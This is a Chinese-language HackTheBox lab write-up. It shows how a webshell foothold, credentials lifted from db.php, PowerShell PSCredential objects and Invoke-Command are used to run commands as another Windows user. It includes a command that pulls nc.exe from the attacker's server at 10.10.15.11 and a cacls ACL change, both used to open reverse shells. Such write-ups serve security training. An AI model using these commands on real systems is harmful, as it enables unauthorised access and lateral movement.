I".<h2 id="题目设定与前提">题目设定与前提</h2>

<p>近期做 HTB 学习到了一些 WINDOWS 越权执行的知识，通过前期信息收集与渗透，目前我们已经通过 webshell 新建一了个临时目录 Temp，并上传了 nc.exe 拿到了靶机中的普通用户权限。</p>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcoxf4sjpyj30im060gms.jpg" alt="image-20200310164628331" /></p>

<p>同时还从 db.php 发现了一个 dbuser 的凭证</p>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcoszxr5pqj31460ektcf.jpg" alt="Xnip2020-03-09_01-44-55 2" /></p>

<p>查看用户组，发现这是用户 “Chris” 的凭证。现在我们需要做的就是要越权到用户 Chris 目录下</p>

<h2 id="生成-pscredential-对象">生成 PSCredential 对象</h2>

<p>很多 Powershell 的 cmdlet 可以添加一个 PSCredential 的对象，用于使用特定用户运行 cmdlet。有两种方式生成 PSCredential 对象</p>

<h3 id="方法一">方法一</h3>

<hr />

<p>使用 <code class="highlighter-rouge">Get-Credential</code> 命令，会让输入用户名和密码，这种方式可以被用于交互式模式下</p>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcouvm8y5lj319v0u0dnz.jpg" alt="Xnip2020-03-10_15-16-41" /></p>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcouvqvo29j31aq0p00zp.jpg" alt="Xnip2020-03-10_15-18-21" /></p>

<h3 id="方法二">方法二</h3>

<hr />

<p>大多数情况下，你不会希望在交互模式下生成 <code class="highlighter-rouge">credential objects</code>，因为这样无法在脚本或自动化工具中使用</p>

<p>为此我们需要先生成一个包含密码的 <code class="highlighter-rouge">secure string</code>，之后将 <code class="highlighter-rouge">secure string</code> 和用户名传给 <code class="highlighter-rouge">System.Management.Automation</code> 的 PSCredential 方法</p>

<p><strong>具体操作</strong></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$secpasswd</span> <span class="o">=</span> ConvertTo-SecureString <span class="s2">"PlainTextPassword"</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
<span class="nv">$creds</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="o">(</span><span class="s2">"username"</span>, <span class="nv">$secpasswd</span><span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>下面我们分析一下上述 cmdlets</p>

<p><code class="highlighter-rouge">ScureStrings</code> 是微软在 2.0 版本的 .NET 中引进的一个类，相比于传统 Strings 类更适合用于密码等加密信息，其新特性为：</p>

<ol>
  <li>不再是不可改变的</li>
  <li>可被人工销毁</li>
  <li>不再会在内存中已明文保存密码，防止被内存提取</li>
</ol>

<p><code class="highlighter-rouge">ConvertTo-SecureString -AsPlainText</code> 可以将密码以明文储存进 <code class="highlighter-rouge">secure string</code>，但 <code class="highlighter-rouge">-Force</code> 选项是必需的，因为明文存储本身是危险的，会被禁止</p>

<p><code class="highlighter-rouge">New-Object System.Management.Automation.PSCredential ("username", $secpasswd)</code> 生成一个 PSCredential 对象，用于后续 cmdlets 的执行</p>

<p><a href="https://www.quickstart.com/blog/powershell-credentials-and-securestrings-part-i/">powershell-credentials-and-securestrings</a></p>

<p><a href="http://duffney.io/AddCredentialsToPowerShellFunctions#with-credentials-in-a-variable">How to Add Credential Parameters to PowerShell Functions</a></p>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcowstksurj31e40gmq7v.jpg" alt="image-20200310162500289" /></p>

<h2 id="invoke-command-远程执行反弹-shell">Invoke-Command 远程执行反弹 shell</h2>

<p>Invoke-Command 可以远程执行 cmdlets，具体操作如下</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>Invoke-Command –ComputerName MyServer1 <span class="nt">-ScriptBlock</span> <span class="o">{</span><span class="nb">whoami</span><span class="o">}</span>
Invoke-Command –ComputerName MyServer1 <span class="nt">-Credential</span> demo<span class="se">\s</span>erveradmin <span class="nt">-ScriptBlock</span> <span class="o">{</span><span class="nb">whoami</span><span class="o">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcoxd2zlysj31e808c431.jpg" alt="image-20200310164428895" /></p>

<p>这样实际上我们已经成功越权获得另一个用户 Chris 的权限，下面我们尝试反弹 Chris 的 shell 获得更方便的利用</p>

<p>直接利用之前上传的 nc 反弹，显示权限不足</p>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcoz60ih12j31e40fkjz6.jpg" alt="Xnip2020-03-10_17-46-10" /></p>

<p>有两个方法解决</p>

<h3 id="方法一-1">方法一</h3>

<hr />

<p>修改 nc.exe 的权限，允许任意用户直接运行</p>

<p>首先查看 nc.exe 原本的权限</p>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcoz8shjbxj313e0d6q58.jpg" alt="image-20200310174933649" /></p>

<p>修改权限</p>

<p><code class="highlighter-rouge">cacls nc.exe /t /e /g everyone:f</code></p>

<p><code class="highlighter-rouge">/t</code> 表示修改文件夹及子文件夹中所有文件的ACL.
<code class="highlighter-rouge">/e </code>表示仅做编辑工作而不替换.
<code class="highlighter-rouge">/c </code>表示在出现拒绝访问错误时继续.
<code class="highlighter-rouge">/g every:f</code>表示给予本地所有用户以完全控制的权限.
<code class="highlighter-rouge">"f"</code>代表完全控制，如果只是希望给予读取权限，那么应当是 <code class="highlighter-rouge">"r"</code></p>

<p>再次查看权限，发现权限修改成功</p>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcozd0t1dpj313c0gutbs.jpg" alt="image-20200310175336704" /></p>

<p>重新远程反弹 shell</p>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcozfpha0rj31e60imwmq.jpg" alt="image-20200310175612690" /></p>

<p>成功获取用户 Chris 的 shell</p>

<h3 id="方法二-1">方法二</h3>

<hr />

<p>既然默认用户下的 nc 无权运行，那就向用户 Chris 上传一个新的 nc</p>

<p>先了解一下 <code class="highlighter-rouge">Invoke-WebRequest</code></p>

<p>相当于 <code class="highlighter-rouge">curl</code> 命令，获取 http 的请求访问内容</p>

<p><strong>语法Syntax</strong></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>Parameter Set: Default
Invoke-WebRequest <span class="o">[</span><span class="nt">-Uri</span><span class="o">]</span> &lt;Uri&gt; <span class="o">[</span><span class="nt">-Body</span> &lt;Object&gt; <span class="o">]</span> <span class="o">[</span><span class="nt">-Certificate</span> &lt;X509Certificate&gt; <span class="o">]</span> <span class="o">[</span><span class="nt">-CertificateThumbprint</span> &lt;String&gt; <span class="o">]</span> <span class="o">[</span><span class="nt">-ContentType</span> &lt;String&gt; <span class="o">]</span> <span class="o">[</span><span class="nt">-Credential</span> &lt;PSCredential&gt; <span class="o">]</span> <span class="o">[</span><span class="nt">-DisableKeepAlive</span><span class="o">]</span> <span class="o">[</span><span class="nt">-Headers</span> &lt;IDictionary&gt; <span class="o">]</span> <span class="o">[</span><span class="nt">-InFile</span> &lt;String&gt; <span class="o">]</span> <span class="o">[</span><span class="nt">-MaximumRedirection</span> &lt;Int32&gt; <span class="o">]</span> <span class="o">[</span><span class="nt">-Method</span> &lt;WebRequestMethod&gt; <span class="o">{</span>Default | Get | Head | Post | Put | Delete | Trace | Options | Merge | Patch<span class="o">}</span> <span class="o">]</span> <span class="o">[</span><span class="nt">-OutFile</span> &lt;String&gt; <span class="o">]</span> <span class="o">[</span><span class="nt">-PassThru</span><span class="o">]</span> <span class="o">[</span><span class="nt">-Proxy</span> &lt;Uri&gt; <span class="o">]</span> <span class="o">[</span><span class="nt">-ProxyCredential</span> &lt;PSCredential&gt; <span class="o">]</span> <span class="o">[</span><span class="nt">-ProxyUseDefaultCredentials</span><span class="o">]</span> <span class="o">[</span><span class="nt">-SessionVariable</span> &lt;String&gt; <span class="o">]</span> <span class="o">[</span><span class="nt">-TimeoutSec</span> &lt;Int32&gt; <span class="o">]</span> <span class="o">[</span><span class="nt">-TransferEncoding</span> &lt;String&gt; <span class="o">{</span>chunked | compress | deflate | <span class="nb">gzip</span> | identity<span class="o">}</span> <span class="o">]</span> <span class="o">[</span><span class="nt">-UseBasicParsing</span><span class="o">]</span> <span class="o">[</span><span class="nt">-UseDefaultCredentials</span><span class="o">]</span> <span class="o">[</span><span class="nt">-UserAgent</span> &lt;String&gt; <span class="o">]</span> <span class="o">[</span><span class="nt">-WebSession</span> &lt;WebRequestSession&gt; <span class="o">]</span> <span class="o">[</span> &lt;CommonParameters&gt;]
</pre></td></tr></tbody></table></code></pre></div></div>

<p>我们先开启本地 kali 的 web 服务，将 nc.exe 放进对应文件夹，之后远程执行下列命令，从我们本地服务器将 nc 下载保存至用户 Chris 的目录下</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Invoke-Command <span class="nt">-ComputerName</span> sniper <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span><span class="nb">cd </span>C:<span class="se">\U</span>sers<span class="se">\C</span>hris<span class="se">\D</span>ocuments<span class="se">\;</span><span class="nv">$url</span><span class="o">=</span><span class="s2">"http://10.10.15.11/nc.exe"</span><span class="p">;</span><span class="nv">$output</span><span class="o">=</span><span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\C</span><span class="s2">hris</span><span class="se">\D</span><span class="s2">ocuments</span><span class="se">\n</span><span class="s2">c.exe"</span><span class="p">;</span>Invoke-WebRequest <span class="nt">-Uri</span> <span class="nv">$url</span> <span class="nt">-Outfile</span> <span class="nv">$output</span><span class="p">;</span><span class="nb">dir</span><span class="o">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcp0r35n46j31e80na0z9.jpg" alt="image-20200310183924496" /></p>

<p>再远程反弹 shell，成功</p>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcp0qosjh7j31e20gotfm.jpg" alt="image-20200310184122085" /></p>

<h2 id="总结">总结</h2>

<p>上述即为整个越权反弹 shell 的内容，一些很基本的命令结合起来使用就能达到很神奇的效果。</p>

:ET